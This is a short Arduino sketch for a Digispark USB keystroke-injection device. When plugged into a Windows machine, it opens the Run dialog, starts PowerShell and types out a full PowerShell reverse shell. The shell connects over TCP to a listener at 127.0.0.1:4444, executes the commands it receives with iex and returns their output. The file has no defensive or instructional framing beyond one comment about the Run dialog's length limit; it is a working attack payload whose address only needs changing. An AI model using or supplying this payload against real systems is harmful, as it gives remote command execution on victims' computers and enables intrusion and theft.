#include "DigiKeyboard.h"

void setup() {

  DigiKeyboard.update();
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(0);
  // Press Windows Key + R to open the Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  DigiKeyboard.delay(1000);

  DigiKeyboard.print("powershell.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);

  // Normally we would type this out in the Run dialog, but the Run dialog has a maximum of 259 characters and this is way over
  DigiKeyboard.print(F("$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


}

void loop() {}
